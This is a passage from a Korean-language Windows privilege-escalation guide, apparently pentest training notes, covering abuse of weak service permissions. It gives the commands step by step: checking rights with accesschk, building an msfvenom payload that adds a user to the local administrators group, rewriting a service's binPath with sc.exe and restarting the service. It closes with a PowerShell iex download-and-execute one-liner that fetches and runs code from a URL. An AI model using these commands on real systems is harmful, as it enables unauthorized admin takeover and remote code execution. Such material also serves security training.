restart service." } catch { "You do NOT have permission to restart the service." }` 

Step 5) **서비스 재시작**

`Restart-Service -Name <서비스명>`

### 5.2.5. Weak Service Permissions (잘못 설정된 서비스 권한)

<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />

**잘못 설정된 서비스 권한으로 악용할 수 있는 방법**

1. 서비스 자체에 권한을 가지고 있을 경우 - 서비스의 바이너리 실행 파일 경로인 binPath 속성을 변경해 공격자의 페이로드가 서비스 대신 실행
2. 서비스 바이너리 실행 파일 자체에 대한 권한을 가지고 있을 경우 - 서비스 바이너리 실행 파일을 공격자의 페이로드로 덮어씌운 뒤, 공격자의 페이로드를 실행합니다.
</aside>

Step 1) **유저가 특정 서비스와 관련된 권한을 가지고 있는 지 파악**

`.\accesschk.exe -accepteula -ucqv <유저이름> <서비스명>`

Step 2) **서비스 정보 확인**

`sc.exe qc <서비스명>`

Step 3) **페이로드 생성**

`msfvenom -p windows/x64/exec CMD="net localgroup administrators redraccoon /add" -f
exe-service -o evilsvc.exe`

Step 4) **서비스 binPath 변경**

`sc.exe config <서비스명> binpath= "C:\Users\redraccoon\Desktop\evilsvc.exe"`

Step 5) **서비스 재시작**

`Restart-Service <서비스명>`

```powershell
iex(new-object net.webclient).downloadstring("<url>");

```
